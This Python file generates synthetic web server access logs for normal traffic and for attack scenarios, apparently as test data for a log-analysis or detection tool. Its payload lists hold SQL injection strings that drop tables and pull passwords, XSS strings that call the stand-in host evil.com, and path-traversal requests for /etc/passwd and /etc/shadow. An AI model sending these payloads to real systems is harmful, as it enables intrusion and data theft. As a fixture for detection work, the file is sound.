from datetime import datetime, timedelta
import random

NORMAL_IPS = [
    "192.168.1.10", "192.168.1.11", "192.168.1.12", "192.168.1.13",
    "10.0.0.5", "10.0.0.6", "10.0.0.7", "10.0.0.8",
    "172.16.0.20", "172.16.0.21", "172.16.0.22", "172.16.0.23",
]
ATTACKER_IPS = ["45.33.32.156", "104.236.198.23", "185.220.101.34", "91.121.87.10", "5.188.62.18"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "PostmanRuntime/7.36.0",
]
ENDPOINTS = [
    "/api/users", "/api/users/me", "/api/products", "/api/products/top",
    "/api/orders", "/api/orders/recent", "/api/auth/login", "/api/auth/refresh",
    "/api/search", "/api/categories", "/api/reviews", "/api/cart",
    "/api/checkout", "/api/status", "/api/health",
]
METHODS = ["GET", "GET", "GET", "GET", "POST", "POST", "PUT", "DELETE"]

SQLI_PAYLOADS = [
    "/api/users?id=1 OR 1=1--",
    "/api/products?category=' UNION SELECT username,password FROM users--",
    "/api/search?q=test'; DROP TABLE orders;--",
    "/api/auth/login?user=admin'--",
    "/api/users?id=1 UNION SELECT * FROM information_schema.tables--",
    "/api/products?id=1; SELECT * FROM credit_cards--",
    "/api/search?q=' OR '1'='1' --",
    "/api/orders?filter='; INSERT INTO admin VALUES('hacker','pass')--",
]
XSS_PAYLOADS = [
    "/api/search?q=<script>alert(1)</script>",
    "/api/profile?name=<img src=x onerror=fetch('http://evil.com/steal')>",
    "/api/redirect?url=javascript:document.location='http://evil.com'",
    "/api/comments?text=<svg onload=eval(atob('YWxlcnQoMSk='))>",
    "/api/forum?post=<body onload=document.cookie>",
    "/api/upload?desc=<iframe src=javascript:alert(1)>",
]
TRAVERSAL_PAYLOADS = [
    "/api/download?file=../../etc/passwd",
    "/api/files?path=../../../var/log/auth.log",
    "/api/export?template=%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "/api/backup?dir=....//....//windows/win.ini",
    "/api/import?file=..\\..\\..\\boot.ini",
    "/api/view?doc=..%2f..%2f..%2fetc%2fhosts",
]
SLOW_ENDPOINTS = [
    ("GET /api/reports/generate HTTP/1.1", 5.0, 8.0),
    ("GET /api/analytics/dashboard HTTP/1.1", 3.0, 6.0),
    ("GET /api/export/csv HTTP/1.1", 4.0, 7.0),
    ("POST /api/bulk/import HTTP/1.1", 6.0, 10.0),
    ("GET /api/logs/query HTTP/1.1", 2.5, 5.0),
]


def _fmt_time(base: datetime, offset_seconds: int) -> str:
    return (base + timedelta(seconds=offset_seconds)).strftime("%d/%b/%Y:%H:%M:%S -0300")


def _make_line(ip: str, request: str, status: int, size: int, rt: float, ts: str, ua: str) -> str:
    return f'{ip} - - [{ts}] "{request}" {status} {size} "-" "{ua}" {rt:.3f}'


def _gen_normal_entry(ip: str, base: datetime, idx: int) -> str:
    method = random.choice(METHODS)
    endpoint = random.choice(ENDPOINTS)
    status = random.choices([200, 201, 204, 301, 304, 400, 404], weights=[45, 8, 5, 5, 5, 2, 2])[0]
    size = random.randint(80, 8000)
    rt = round(random.uniform(0.01, 0.45), 3)
    ua = random.choice(USER_AGENTS)
    return _make_line(ip, f"{method} {endpoint} HTTP/1.1", status, size, rt, _fmt_time(base, idx), ua)


def generate_normal_traffic() -> str:
    base = datetime(2024, 6, 10, 9, 0, 0)
    lines = []
    for i in range(120):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, i))
    return "\n".join(lines)


def generate_anomaly_scenario() -> str:
    base = datetime(2024, 6, 10, 14, 0, 0)
    lines = []
    idx = 0

    for _ in range(60):
        ip = "192.168.1.100"
        status = random.choices([401, 403, 429], weights=[50, 30, 20])[0]
        lines.append(_make_line(ip, "POST /api/auth/login HTTP/1.1", status, 45, 0.12, _fmt_time(base, idx), "python-requests/2.31.0"))
        idx += 1

    for _ in range(20):
        ip = "10.0.0.99"
        lines.append(_make_line(ip, "GET /api/admin/config HTTP/1.1", 500, 50, 2.5, _fmt_time(base, idx), "curl/7.88.1"))
        idx += 1

    for _ in range(40):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, idx))
        idx += 1

    return "\n".join(lines)


def generate_sqli_scenario() -> str:
    base = datetime(2024, 6, 10, 22, 0, 0)
    lines = []
    idx = 0

    for _ in range(30):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, idx))
        idx += 1

    for _ in range(6):
        for payload in SQLI_PAYLOADS:
            ip = random.choice(ATTACKER_IPS)
            lines.append(_make_line(ip, f"GET {payload} HTTP/1.1", 200, 432, 0.15, _fmt_time(base, idx), "sqlmap/1.7"))
            idx += 1

    return "\n".join(lines)


def generate_xss_scenario() -> str:
    base = datetime(2024, 6, 11, 3, 0, 0)
    lines = []
    idx = 0

    for _ in range(30):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, idx))
        idx += 1

    for _ in range(8):
        for payload in XSS_PAYLOADS:
            ip = random.choice(ATTACKER_IPS)
            lines.append(_make_line(ip, f"GET {payload} HTTP/1.1", 400, 0, 0.01, _fmt_time(base, idx), "Mozilla/5.0 (XSS Scanner)"))
            idx += 1

    return "\n".join(lines)


def generate_traversal_scenario() -> str:
    base = datetime(2024, 6, 11, 8, 0, 0)
    lines = []
    idx = 0

    for _ in range(25):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, idx))
        idx += 1

    for _ in range(10):
        for payload in TRAVERSAL_PAYLOADS:
            ip = random.choice(ATTACKER_IPS)
            lines.append(_make_line(ip, f"GET {payload} HTTP/1.1", 403, 45, 0.005, _fmt_time(base, idx), "DirBuster/2.0"))
            idx += 1

    return "\n".join(lines)


def generate_performance_scenario() -> str:
    base = datetime(2024, 6, 11, 12, 0, 0)
    lines = []
    idx = 0

    for _ in range(30):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, idx))
        idx += 1

    for _ in range(50):
        req, lo, hi = random.choice(SLOW_ENDPOINTS)
        rt = round(random.uniform(lo, hi), 3)
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, req, 200, 3000, rt, _fmt_time(base, idx), USER_AGENTS[0]))
        idx += 1

    for _ in range(20):
        ip = random.choice(NORMAL_IPS)
        lines.append(_make_line(ip, "GET /api/ping HTTP/1.1", 200, 10, 0.002, _fmt_time(base, idx), USER_AGENTS[2]))
        idx += 1

    return "\n".join(lines)


def generate_full_attack_scenario() -> str:
    base = datetime(2024, 6, 12, 16, 0, 0)
    lines = []
    idx = 0

    for _ in range(80):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, idx))
        idx += 1

    for _ in range(40):
        status = random.choices([401, 403], weights=[70, 30])[0]
        lines.append(_make_line("45.33.32.156", "POST /api/auth/login HTTP/1.1", status, 45, 0.11, _fmt_time(base, idx), "hydra/9.2"))
        idx += 1

    for _ in range(25):
        ip = "10.0.0.99"
        lines.append(_make_line(ip, "GET /api/admin/config HTTP/1.1", 500, 50, 3.5, _fmt_time(base, idx), "curl/7.88.1"))
        idx += 1

    for _ in range(4):
        for payload in SQLI_PAYLOADS:
            lines.append(_make_line("104.236.198.23", f"GET {payload} HTTP/1.1", 200, 500, 0.08, _fmt_time(base, idx), "sqlmap/1.7"))
            idx += 1

    for _ in range(3):
        for payload in XSS_PAYLOADS:
            lines.append(_make_line("185.220.101.34", f"GET {payload} HTTP/1.1", 400, 0, 0.01, _fmt_time(base, idx), "Mozilla/5.0 (XSS)"))
            idx += 1

    for _ in range(3):
        for payload in TRAVERSAL_PAYLOADS:
            lines.append(_make_line("91.121.87.10", f"GET {payload} HTTP/1.1", 403, 45, 0.005, _fmt_time(base, idx), "DirBuster/2.0"))
            idx += 1

    for _ in range(30):
        req, lo, hi = random.choice(SLOW_ENDPOINTS)
        rt = round(random.uniform(lo, hi), 3)
        ip = random.choice(NORMAL_IPS[:4])
        lines.append(_make_line(ip, req, 200, 3000, rt, _fmt_time(base, idx), USER_AGENTS[0]))
        idx += 1

    for _ in range(20):
        ip = random.choice(NORMAL_IPS)
        lines.append(_gen_normal_entry(ip, base, idx))
        idx += 1

    return "\n".join(lines)


SAMPLES = {
    "normal": ("Normal Traffic Baseline", generate_normal_traffic),
    "anomaly": ("Brute Force & Server Errors", generate_anomaly_scenario),
    "sqli": ("SQL Injection Attacks", generate_sqli_scenario),
    "xss": ("XSS Attacks", generate_xss_scenario),
    "traversal": ("Path Traversal Attacks", generate_traversal_scenario),
    "performance": ("Slow Endpoints", generate_performance_scenario),
    "full-attack": ("Full Attack Scenario", generate_full_attack_scenario),
}
